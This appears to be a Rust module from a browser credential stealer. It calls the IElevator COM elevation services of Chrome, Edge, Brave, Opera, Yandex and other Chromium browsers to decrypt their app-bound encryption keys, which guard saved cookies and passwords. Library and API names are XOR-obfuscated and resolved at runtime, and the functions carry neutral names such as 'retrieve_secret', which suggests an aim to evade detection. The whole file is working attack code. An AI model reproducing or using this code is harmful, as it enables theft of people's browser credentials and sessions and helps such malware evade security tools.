//! Privileged provider bridge (COM dispatch layer).

#![allow(non_snake_case, non_camel_case_types)]

use std::ffi::c_void;
use std::mem;
use std::sync::OnceLock;

use windows::{
    core::PCSTR,
    Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
};

const OBF: u8 = 0x4E;

// ── GUID ──────────────────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Clone, Copy, Debug)]
pub struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

fn unfold(enc: &[u8; 16]) -> GUID {
    let mut raw = [0u8; 16];
    for i in 0..16 {
        raw[i] = enc[i] ^ OBF;
    }
    GUID {
        data1: u32::from_le_bytes(raw[0..4].try_into().unwrap()),
        data2: u16::from_le_bytes(raw[4..6].try_into().unwrap()),
        data3: u16::from_le_bytes(raw[6..8].try_into().unwrap()),
        data4: raw[8..16].try_into().unwrap(),
    }
}

fn reveal(enc: &[u8]) -> String {
    enc.iter().map(|&b| (b ^ OBF) as char).collect()
}

fn reveal_cstr(enc: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = enc.iter().map(|&b| b ^ OBF).collect();
    v.push(0);
    v
}

fn leak_iids(list: &[[u8; 16]]) -> &'static [GUID] {
    let vec: Vec<GUID> = list.iter().map(unfold).collect();
    vec.leak()
}

const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
    GUID {
        data1: d1,
        data2: d2,
        data3: d3,
        data4: d4,
    }
}

const SVC_CHROMIUM: &[u8] = &[0x0d, 0x26, 0x3c, 0x21, 0x23, 0x27, 0x3b, 0x23, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_CHROME: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_CHROME_BETA: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0c, 0x2b, 0x3a, 0x2f, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_CHROME_DEV: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0a, 0x2b, 0x38, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_CHROME_CANARY: &[u8] = &[0x09, 0x21, 0x21, 0x29, 0x22, 0x2b, 0x0d, 0x26, 0x3c, 0x21, 0x23, 0x2b, 0x0d, 0x2f, 0x20, 0x2f, 0x3c, 0x37, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_BRAVE: &[u8] = &[0x0c, 0x3c, 0x2f, 0x38, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_EDGE: &[u8] = &[0x03, 0x27, 0x2d, 0x3c, 0x21, 0x3d, 0x21, 0x28, 0x3a, 0x0b, 0x2a, 0x29, 0x2b, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_VIVALDI: &[u8] = &[0x18, 0x27, 0x38, 0x2f, 0x22, 0x2a, 0x27, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_OPERA: &[u8] = &[0x01, 0x3e, 0x2b, 0x3c, 0x2f, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];
const SVC_YANDEX: &[u8] = &[0x17, 0x2f, 0x20, 0x2a, 0x2b, 0x36, 0x0c, 0x3c, 0x21, 0x39, 0x3d, 0x2b, 0x3c, 0x0b, 0x22, 0x2b, 0x38, 0x2f, 0x3a, 0x27, 0x21, 0x20, 0x1d, 0x2b, 0x3c, 0x38, 0x27, 0x2d, 0x2b];

// Shared base interfaces (Chromium/Chrome family).
const IID_ELEVATOR2: GUID = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);
const IID_ELEVATOR2_CHROMIUM: GUID = guid(0xBB19A0E5, 0x00C6, 0x4966, [0x94, 0xB2, 0x5A, 0xFE, 0xC6, 0xFE, 0xD9, 0x3A]);
const IID_ELEVATOR: GUID = guid(0xA949CB4E, 0xC4F9, 0x44C4, [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C]);
const IID_ELEVATOR_CHROMIUM: GUID = guid(0xB88C45B9, 0x8825, 0x4629, [0xB3, 0x8E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED]);

const IID_ELEVATOR2_CHROME: GUID = guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38]);
const IID_ELEVATOR_CHROME: GUID = guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]);

const IID_ELEVATOR2_CHROME_BETA: GUID = guid(0xB96A14B8, 0xD0B0, 0x44D8, [0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54]);
const IID_ELEVATOR_CHROME_BETA: GUID = guid(0xA2721D66, 0x376E, 0x4D2F, [0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F]);

const IID_ELEVATOR2_CHROME_DEV: GUID = guid(0x3FEFA48E, 0xC8BF, 0x461F, [0xAE, 0xD6, 0x63, 0xF6, 0x58, 0xCC, 0x85, 0x0A]);
const IID_ELEVATOR_CHROME_DEV: GUID = guid(0xBB2AA26B, 0x343A, 0x4072, [0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71]);

const IID_ELEVATOR2_CHROME_CANARY: GUID = guid(0xFF672E9F, 0x0994, 0x4322, [0x81, 0xE5, 0x3A, 0x5A, 0x97, 0x46, 0x14, 0x0A]);
const IID_ELEVATOR_CHROME_CANARY: GUID = guid(0x4F7CE041, 0x28E9, 0x484F, [0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4]);

const IID_ELEVATOR_BRAVE: GUID = guid(0xF396861E, 0x0C8E, 0x4C71, [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0x9E]);
const IID_ELEVATOR_BRAVE_BASE: GUID = guid(0x5A9A9462, 0x2FA1, 0x4FEB, [0xB7, 0xF2, 0xDF, 0x3D, 0x19, 0x13, 0x44, 0x63]);

const IID_ELEVATOR_EDGE: GUID = guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]);

static CHROME_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_BETA_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_BETA,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_BETA,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_DEV_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_DEV,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_DEV,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static CHROME_CANARY_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME_CANARY,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROME_CANARY,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
];

static BRAVE_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_BRAVE,
    IID_ELEVATOR_BRAVE_BASE,
    IID_ELEVATOR_CHROMIUM,
];

static EDGE_IIDS: &[GUID] = &[
    IID_ELEVATOR2,
    IID_ELEVATOR_EDGE,
    IID_ELEVATOR,
];

// ── Browser configs ───────────────────────────────────────────────────────────

/// One browser's COM class + interface pair.
pub struct BrowserCom {
    pub name: &'static str,
    /// Registry CLSID for the elevation service
    pub clsid: GUID,
    /// Interface IIDs to try in order (newest first)
    pub iids: &'static [GUID],
    /// Expected subfolder under %LOCALAPPDATA% for User Data
    pub user_data_rel: &'static str,
    /// Encoded elevation service hint (decoded at runtime)
    pub svc_hint: &'static [u8],
}

static GENERIC_CHROMIUM_IIDS: &[GUID] = &[
    IID_ELEVATOR2_CHROMIUM,
    IID_ELEVATOR2,
    IID_ELEVATOR_CHROMIUM,
    IID_ELEVATOR,
    IID_ELEVATOR2_CHROME,
    IID_ELEVATOR_CHROME,
];

static GENERIC_CHROMIUM: BrowserCom = BrowserCom {
    name: "Chromium",
    clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
    iids: GENERIC_CHROMIUM_IIDS,
    user_data_rel: r"Chromium\User Data",
    svc_hint: SVC_CHROMIUM,
};

static BROWSERS: &[BrowserCom] = &[
    BrowserCom {
        name: "Chrome",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: CHROME_IIDS,
        user_data_rel: r"Google\Chrome\User Data",
        svc_hint: SVC_CHROME,
    },
    BrowserCom {
        name: "Chrome Beta",
        clsid: guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]),
        iids: CHROME_BETA_IIDS,
        user_data_rel: r"Google\Chrome Beta\User Data",
        svc_hint: SVC_CHROME_BETA,
    },
    BrowserCom {
        name: "Chrome Dev",
        clsid: guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]),
        iids: CHROME_DEV_IIDS,
        user_data_rel: r"Google\Chrome Dev\User Data",
        svc_hint: SVC_CHROME_DEV,
    },
    BrowserCom {
        name: "Chrome Canary",
        clsid: guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]),
        iids: CHROME_CANARY_IIDS,
        user_data_rel: r"Google\Chrome SxS\User Data",
        svc_hint: SVC_CHROME_CANARY,
    },
    BrowserCom {
        name: "Brave",
        clsid: guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]),
        iids: BRAVE_IIDS,
        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
        svc_hint: SVC_BRAVE,
    },
    BrowserCom {
        name: "Edge",
        clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
        iids: EDGE_IIDS,
        user_data_rel: r"Microsoft\Edge\User Data",
        svc_hint: SVC_EDGE,
    },
    BrowserCom {
        name: "Vivaldi",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Vivaldi\User Data",
        svc_hint: SVC_VIVALDI,
    },
    BrowserCom {
        name: "Opera",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Opera Software\Opera Stable",
        svc_hint: SVC_OPERA,
    },
    BrowserCom {
        name: "Yandex",
        clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
        iids: GENERIC_CHROMIUM_IIDS,
        user_data_rel: r"Yandex\YandexBrowser\User Data",
        svc_hint: SVC_YANDEX,
    },
];

pub fn all_browsers() -> &'static [BrowserCom] {
    BROWSERS
}

/// Detect browser + channel from the running process executable path.
pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
    let exe = exe_path.to_lowercase();

    if exe.contains("brave") {
        if exe.contains("beta") {
            return BROWSERS.iter().find(|b| b.name == "Brave");
        }
        if exe.contains("nightly") {
            return BROWSERS.iter().find(|b| b.name == "Brave");
        }
        return BROWSERS.iter().find(|b| b.name == "Brave");
    }
    if exe.contains("msedge") || (exe.contains("edge") && !exe.contains("chrome")) {
        if exe.contains("beta") {
            return BROWSERS.iter().find(|b| b.name == "Edge");
        }
        if exe.contains("dev") {
            return BROWSERS.iter().find(|b| b.name == "Edge");
        }
        return BROWSERS.iter().find(|b| b.name == "Edge");
    }
    if exe.contains("vivaldi") {
        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
    }
    if exe.contains("opera") {
        return BROWSERS.iter().find(|b| b.name == "Opera");
    }
    if exe.contains("yandex") {
        return BROWSERS.iter().find(|b| b.name == "Yandex");
    }
    if exe.contains("coccoc") {
        return Some(&GENERIC_CHROMIUM);
    }
    if exe.contains("360chrome") || exe.contains("epic") || exe.contains("uran")
        || exe.contains("7star") || exe.contains("torch") || exe.contains("kometa")
        || exe.contains("orbitum") || exe.contains("amigo") || exe.contains("sputnik")
        || exe.contains("slimjet") || exe.contains("iridium") || exe.contains("thorium")
        || exe.contains("centbrowser") || exe.contains("\\arc\\")
    {
        return Some(&GENERIC_CHROMIUM);
    }
    if exe.contains("chrome") {
        if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
        }
        if exe.contains("chrome dev") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
        }
        if exe.contains("chrome beta") {
            return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
        }
        if exe.contains("chromium") && !exe.contains("google") {
            return Some(&GENERIC_CHROMIUM);
        }
        return BROWSERS.iter().find(|b| b.name == "Chrome");
    }

    None
}

fn guid_to_string(g: &GUID) -> String {
    format!(
        "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
        g.data1,
        g.data2,
        g.data3,
        g.data4[0],
        g.data4[1],
        g.data4[2],
        g.data4[3],
        g.data4[4],
        g.data4[5],
        g.data4[6],
        g.data4[7],
    )
}

// ── Dynamic COM/OLE dispatch ──────────────────────────────────────────────────

type FnCoInit = unsafe extern "system" fn(*const c_void, u32) -> i32;
type FnCoVoid = unsafe extern "system" fn();
type FnCoCreate = unsafe extern "system" fn(*const GUID, *const c_void, u32, *const GUID, *mut *mut c_void) -> i32;
type FnCoBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
type FnSysAlloc = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
type FnSysFree = unsafe extern "system" fn(*mut u16);
type FnSysLen = unsafe extern "system" fn(*const u16) -> u32;

struct ComApi {
    co_init: FnCoInit,
    co_uninit: FnCoVoid,
    co_create: FnCoCreate,
    co_blanket: FnCoBlanket,
    sys_alloc: FnSysAlloc,
    sys_free: FnSysFree,
    sys_len: FnSysLen,
}

const ENC_OLE32: &[u8] = &[0x21, 0x22, 0x2b, 0x7d, 0x7c, 0x60, 0x2a, 0x22, 0x22];
const ENC_OLEAUT32: &[u8] = &[0x21, 0x22, 0x2b, 0x2f, 0x3b, 0x3a, 0x7d, 0x7c, 0x60, 0x2a, 0x22, 0x22];
const ENC_CO_INIT: &[u8] = &[0x0d, 0x21, 0x07, 0x20, 0x27, 0x3a, 0x27, 0x2f, 0x22, 0x27, 0x34, 0x2b, 0x0b, 0x36];
const ENC_CO_UNINIT: &[u8] = &[0x0d, 0x21, 0x1b, 0x20, 0x27, 0x20, 0x27, 0x3a, 0x27, 0x2f, 0x22, 0x27, 0x34, 0x2b];
const ENC_CO_CREATE: &[u8] = &[
    0x0d, 0x21, 0x0d, 0x3c, 0x2b, 0x2f, 0x3a, 0x2b, 0x07, 0x20, 0x3d, 0x3a, 0x2f, 0x20, 0x2d, 0x2b,
];
const ENC_CO_BLANKET: &[u8] = &[
    0x0d, 0x21, 0x1d, 0x2b, 0x3a, 0x1e, 0x3c, 0x21, 0x36, 0x37, 0x0c, 0x22, 0x2f, 0x20, 0x25, 0x2b, 0x3a,
];
const ENC_SYS_ALLOC: &[u8] = &[
    0x1d, 0x37, 0x3d, 0x0f, 0x22, 0x22, 0x21, 0x2d, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29, 0x0c, 0x37, 0x3a,
    0x2b, 0x02, 0x2b, 0x20,
];
const ENC_SYS_FREE: &[u8] = &[0x1d, 0x37, 0x3d, 0x08, 0x3c, 0x2b, 0x2b, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29];
const ENC_SYS_LEN: &[u8] = &[
    0x1d, 0x37, 0x3d, 0x1d, 0x3a, 0x3c, 0x27, 0x20, 0x29, 0x0c, 0x37, 0x3a, 0x2b, 0x02, 0x2b, 0x20,
];

static COM: OnceLock<ComApi> = OnceLock::new();

fn com_api() -> &'static ComApi {
    COM.get_or_init(|| unsafe {
        let ole32 = reveal_cstr(ENC_OLE32);
        let oleaut = reveal_cstr(ENC_OLEAUT32);
        let h32 = GetModuleHandleA(PCSTR(ole32.as_ptr())).expect("ole32");
        let haut = GetModuleHandleA(PCSTR(oleaut.as_ptr())).expect("oleaut32");
        let load = |h, enc: &[u8]| {
            let name = reveal_cstr(enc);
            GetProcAddress(h, PCSTR(name.as_ptr())).expect("export")
        };
        ComApi {
            co_init: mem::transmute(load(h32, ENC_CO_INIT)),
            co_uninit: mem::transmute(load(h32, ENC_CO_UNINIT)),
            co_create: mem::transmute(load(h32, ENC_CO_CREATE)),
            co_blanket: mem::transmute(load(h32, ENC_CO_BLANKET)),
            sys_alloc: mem::transmute(load(haut, ENC_SYS_ALLOC)),
            sys_free: mem::transmute(load(haut, ENC_SYS_FREE)),
            sys_len: mem::transmute(load(haut, ENC_SYS_LEN)),
        }
    })
}

// ── IElevator COM vtable ──────────────────────────────────────────────────────
// vtable[0]: QueryInterface
// vtable[1]: AddRef
// vtable[2]: Release
// vtable[3]: RunRecoveryCRXElevated  (skipped)
// vtable[4]: EncryptData             (skipped)
// vtable[5]: DecryptData             ← called

type FnQI = unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32;
type FnRef = unsafe extern "system" fn(*mut c_void) -> u32;
type FnRun =
    unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16, u32, *mut usize) -> i32;
type FnEnc = unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut *mut u16, *mut u32) -> i32;
type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

#[repr(C)]
struct Vtbl {
    qi: FnQI,
    ar: FnRef,
    rel: FnRef,
    run: FnRun,
    enc: FnEnc,
    dec: FnDec,
}
#[repr(C)]
struct IElev {
    vtbl: *const Vtbl,
}

// ── BSTR helpers ──────────────────────────────────────────────────────────────

struct OwnedBstr(*mut u16);

impl OwnedBstr {
    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.is_empty() {
            return None;
        }
        let p = (com_api().sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() {
            None
        } else {
            Some(OwnedBstr(p))
        }
    }
    fn ptr(&self) -> *mut u16 {
        self.0
    }
}
impl Drop for OwnedBstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { (com_api().sys_free)(self.0) };
            self.0 = std::ptr::null_mut();
        }
    }
}

unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
    if p.is_null() {
        return Vec::new();
    }
    let len = (com_api().sys_len)(p) as usize;
    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
    (com_api().sys_free)(p);
    bytes
}

// ── Core decryption ───────────────────────────────────────────────────────────

const COINIT_APARTMENTTHREADED: u32 = 0x2;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
/// Try all browsers and IIDs until one succeeds.
pub fn retrieve_secret(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let api = com_api();
        let hr = (api.co_init)(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 /* S_FALSE */ {
            return Err(format!("init: 0x{hr:08X}"));
        }

        let result = probe_all_hosts(encrypted_key);
        (api.co_uninit)();
        result
    }
}

/// Backward-compatible alias.
pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    retrieve_secret(encrypted_key)
}

/// Try each browser COM config for the detected browser.
pub fn process_with_provider(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let api = com_api();
        let hr = (api.co_init)(std::ptr::null(), COINIT_APARTMENTTHREADED);
        if hr < 0 && hr != 0x0000_0001u32 as i32 {
            return Err(format!("init: 0x{hr:08X}"));
        }
        let r = probe_host(browser, encrypted_key);
        (api.co_uninit)();
        r
    }
}

/// Backward-compatible alias.
pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    process_with_provider(browser, encrypted_key)
}

unsafe fn probe_all_hosts(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no browser tried");
    for b in BROWSERS {
        match probe_host(b, encrypted_key) {
            Ok(key) => return Ok(key),
            Err(e) => last = format!("{}: {e}", b.name),
        }
    }
    match probe_host(&GENERIC_CHROMIUM, encrypted_key) {
        Ok(key) => return Ok(key),
        Err(e) => last = format!("Chromium: {e}"),
    }
    Err(format!("all browsers failed; last: {last}"))
}

unsafe fn probe_host(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no IID tried");
    let mut saw_no_interface = false;
    let mut saw_class_not_reg = false;
    let svc_label = reveal(browser.svc_hint);

    for iid in browser.iids {
        match invoke_one(encrypted_key, &browser.clsid, iid) {
            Ok(key) => return Ok(key),
            Err(e) => {
                if e.contains("0x80004002") {
                    saw_no_interface = true;
                }
                if e.contains("0x80040154") || e.contains("0x80040111") {
                    saw_class_not_reg = true;
                }
                last = e;
            }
        }
    }

    let hint = if saw_class_not_reg {
        format!(
            "Elevation service not registered ({}). Reinstall {} or repair the elevation service.",
            svc_label, browser.name
        )
    } else if saw_no_interface {
        format!(
            "No IElevator interface matched ({}). Ensure {} is up to date.",
            svc_label, browser.name
        )
    } else {
        String::new()
    };

    if hint.is_empty() {
        Err(format!("{} failed; last: {last}", browser.name))
    } else {
        Err(format!("{} failed; last: {last}. {hint}", browser.name))
    }
}

unsafe fn call_decrypt_at_slot(
    punk: *mut c_void,
    enc: &[u8],
    slot: usize,
) -> Result<Vec<u8>, String> {
    let vtbl = *(punk as *const *const *const c_void);
    let dec_fn_ptr = *vtbl.add(slot);
    if dec_fn_ptr.is_null() {
        return Err(format!("null slot {slot}"));
    }
    let dec: FnDec = std::mem::transmute(dec_fn_ptr);

    let cipher = OwnedBstr::from_bytes(enc).ok_or("alloc failed")?;
    let mut plain: *mut u16 = std::ptr::null_mut();
    let mut last_err: u32 = 0;

    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
    if hr_d < 0 {
        return Err(format!("slot {slot} 0x{hr_d:08X} last_error={last_err}"));
    }
    let bytes = consume_bstr(plain);
    if bytes.is_empty() {
        return Err(format!("empty payload at slot {slot}"));
    }
    Ok(bytes)
}

fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
    if bytes.len() == 32 {
        return Some(bytes.to_vec());
    }
    if bytes.len() > 32 {
        let tail = &bytes[bytes.len() - 32..];
        if tail.iter().any(|&b| b != 0) {
            return Some(tail.to_vec());
        }
    }
    None
}

unsafe fn invoke_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
    let api = com_api();
    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = (api.co_create)(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
    if hr < 0 {
        return Err(format!("create 0x{hr:08X}"));
    }
    if punk.is_null() {
        return Err("null provider".into());
    }

    let hr_pb = (api.co_blanket)(
        punk,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        std::ptr::null(),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        std::ptr::null(),
        EOAC_DYNAMIC_CLOAKING,
    );
    let _ = hr_pb;

    let elev = punk as *mut IElev;
    let release = || ((*(*elev).vtbl).rel)(punk);

    let mut last = String::from("no slot worked");
    for slot in [5usize, 8, 6, 7] {
        match call_decrypt_at_slot(punk, enc, slot) {
            Ok(bytes) => {
                if let Some(key) = normalize_com_key(&bytes) {
                    release();
                    return Ok(key);
                }
                last = format!("slot {slot}: unexpected length {}", bytes.len());
            }
            Err(e) => last = e,
        }
    }

    release();
    Err(format!("invoke failed; last: {last}"))
}
